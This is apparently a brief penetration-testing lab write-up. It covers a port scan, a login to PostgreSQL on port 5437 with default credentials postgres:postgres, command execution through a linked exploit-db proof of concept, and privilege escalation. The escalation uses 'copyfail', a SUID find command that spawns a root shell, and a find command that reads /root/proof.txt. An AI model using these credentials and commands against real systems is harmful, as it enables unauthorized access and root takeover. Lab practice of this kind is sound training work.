PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   pmip6-data

login to 5437 postgres using default credentials postgres:postgres and find version
<img width="963" height="99" alt="image" src="https://github.com/user-attachments/assets/59e2300f-7420-4aed-a35f-6f1c93377c00" />

using poc id. able to execute commands
<img width="641" height="226" alt="image" src="https://github.com/user-attachments/assets/1b452deb-adf3-4fd9-8e71-e9ffda5dd88e" />
https://www.exploit-db.com/exploits/50847 

<img width="774" height="154" alt="image" src="https://github.com/user-attachments/assets/85779ca4-3f16-4d90-aa5c-a52ec1ca42a2" />

used copyfail to privesc.

ALTERNATIVE: find . -exec /bin/sh -p \; -quit
<img width="515" height="49" alt="image" src="https://github.com/user-attachments/assets/0483076d-2e87-4c7a-8f41-7576ce2f9315" />

ALTERNATIVE:
find /root/proof.txt -exec cat {} \;
<img width="494" height="69" alt="image" src="https://github.com/user-attachments/assets/55492c4d-f6e8-4f8f-a418-e22bc0a65c4c" />

